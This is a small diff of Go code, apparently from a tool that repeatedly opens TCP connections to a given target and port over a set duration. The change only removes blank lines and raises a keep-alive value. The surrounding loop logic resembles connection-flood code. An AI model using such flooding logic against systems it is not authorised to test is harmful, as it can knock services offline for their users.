@@ -31,9 +31,7 @@ func Handshake(target string, port string, duration string) {
 	for time.Now().Unix() <= sec+int64(dur)-1 {
 		select {
 		case <-balancer.BalanceCh:
-
 		default:
-
 			go handshake(target, port)
 			time.Sleep(200 * time.Millisecond)
 			go handshake(target, port)
@@ -54,7 +52,7 @@ func handshake(target, port string) {
 
 	for i := 0; i < 30; i++ {
 		fmt.Println(i)
-		dial := net.Dialer{Timeout: 5 * time.Second, LocalAddr: nil, DualStack: false, KeepAlive: 100}
+		dial := net.Dialer{Timeout: 5 * time.Second, LocalAddr: nil, DualStack: false, KeepAlive: 5000}
 
 		addr, err := net.ResolveTCPAddr("tcp", net.JoinHostPort(target, port))
 
